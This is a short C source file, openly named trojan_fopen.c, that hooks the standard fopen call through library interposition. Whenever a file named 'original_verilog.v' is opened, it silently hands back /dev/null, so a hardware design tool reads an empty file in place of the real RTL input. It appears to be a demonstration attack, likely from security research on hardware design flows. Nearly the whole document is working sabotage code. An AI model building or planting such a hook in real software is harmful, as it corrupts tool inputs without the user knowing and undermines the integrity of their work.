### trojan_fopen.c

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

FILE *fopen(const char *filename, const char *mode)
{
    static FILE *(*original_fopen)(const char *, const char *) = NULL;

    if (!original_fopen)
        original_fopen = dlsym(RTLD_NEXT, "fopen");

    /* Replace the legitimate RTL input artifact */
    if (strstr(filename, "original_verilog.v")) {
        printf("[AA2T2] Replacing input artifact with empty file\n");
        return original_fopen("/dev/null", mode);
    }

    return original_fopen(filename, mode);
}
```

